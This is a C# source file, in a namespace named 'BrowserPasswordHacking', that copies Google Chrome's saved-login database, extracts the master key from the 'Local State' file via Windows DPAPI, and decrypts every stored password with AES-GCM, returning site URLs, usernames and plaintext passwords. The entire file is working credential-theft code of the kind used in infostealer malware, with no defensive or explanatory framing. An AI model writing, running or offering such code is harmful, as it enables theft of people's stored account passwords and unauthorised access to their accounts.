using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Data;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace BrowserPasswordHacking.Helpers
{
    public class ChromePasswords
    {
        private const string LoginsPath = @"C:\Users\Admin\AppData\Local\Google\Chrome\User Data\Default\Login Data";
        private string TempLoginPath = @"F:\LoginData.db";
        private const string LoginsKeyPath = @"C:\Users\Admin\AppData\Local\Google\Chrome\User Data\Local State";
        public DataTable Passwords()
        {
            //Create new Datatable for results
            DataTable dtResults = new DataTable();
            dtResults.Columns.Add("ActionUrl");
            dtResults.Columns.Add("UserName");
            dtResults.Columns.Add("Password");
            try
            {
                //check if file exists or not
                if (File.Exists(LoginsPath))
                {
                    //To avoid db lock
                    if (File.Exists(TempLoginPath))
                    {
                        File.Delete(TempLoginPath);
                    }
                    File.Copy(LoginsPath, TempLoginPath);

                    //read the file using SQLite
                    using (var conn = new SQLiteConnection($"Data Source={TempLoginPath};"))
                    {
                        conn.Open();
                        using (var cmd = conn.CreateCommand())
                        {
                            cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                            using (var reader = cmd.ExecuteReader())
                            {
                                if (reader.HasRows)
                                {
                                    // Getting Key for decryption
                                    var key = ChromePasswordsKey();

                                    //adding result from logins table
                                    while (reader.Read())
                                    {
                                        byte[] nonce, cipherText;
                                        var encryptedData = ReadSqLiteBytes(reader, 2);
                                        TrimData(encryptedData, out nonce, out cipherText);
                                        var pass = DecryptPassword(cipherText, key, nonce);

                                        DataRow dr = dtResults.NewRow();
                                        dr["ActionUrl"] = Convert.ToString(reader.GetString(0));
                                        dr["UserName"] = Convert.ToString(reader.GetString(1));
                                        dr["Password"] = Convert.ToString(pass);//Decrypted password

                                        dtResults.Rows.Add(dr);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception error)
            {
                error.Message.ToString();
            }
            return dtResults;
        }

        private byte[] ChromePasswordsKey()
        {
            try
            {
                if (File.Exists(LoginsKeyPath))
                {
                    var result = File.ReadAllText(LoginsKeyPath);
                    if (result != null)
                    {
                        dynamic json = JsonConvert.DeserializeObject(result);
                        string key = json.os_crypt.encrypted_key;
                        var tempKey = Convert.FromBase64String(key);

                        var encTempKey = tempKey.Skip(5).ToArray();

                        // Unprotected Key
                        var decryptionkey = ProtectedData.Unprotect(encTempKey, null, DataProtectionScope.CurrentUser);

                        // Protected Encryption/Decryption Key
                        return decryptionkey;
                    }
                }
            }
            catch { }
            return null;
        }

        private string DecryptPassword(byte[] input, byte[] key, byte[] iv)
        {
            try
            {
                // AES - GCM mode 
                var cipher = new GcmBlockCipher(new AesEngine());
                var parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

                cipher.Init(false, parameters);

                var plainBytes = new byte[cipher.GetOutputSize(input.Length)];
                var returnLength = cipher.ProcessBytes(input, 0, input.Length, plainBytes, 0);
                cipher.DoFinal(plainBytes, returnLength);
                string Decryptedresult = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
                if (!string.IsNullOrEmpty(Decryptedresult))
                {
                    return Decryptedresult;
                }
            }
            catch { }
            return null;
        }

        private byte[] ReadSqLiteBytes(SQLiteDataReader reader, int columnNumber)
        {
            try
            {
                byte[] buffer = new byte[2048];
                long bytesRead;
                long offset = 0;
                using (MemoryStream stream = new MemoryStream())
                {
                    while ((bytesRead = reader.GetBytes(columnNumber, offset, buffer, 0, buffer.Length)) > 0)
                    {
                        stream.Write(buffer, 0, (int)bytesRead);
                        offset += bytesRead;
                    }
                    return stream.ToArray();
                }
            }
            catch { }
            return null;
        }


        private void TrimData(byte[] encData, out byte[] nonce, out byte[] cipherText)
        {
            nonce = new byte[12];
            cipherText = new byte[encData.Length - 3 - nonce.Length];

            Array.Copy(encData, 3, nonce, 0, nonce.Length);
            Array.Copy(encData, 3 + nonce.Length, cipherText, 0, cipherText.Length);
        }
    }
}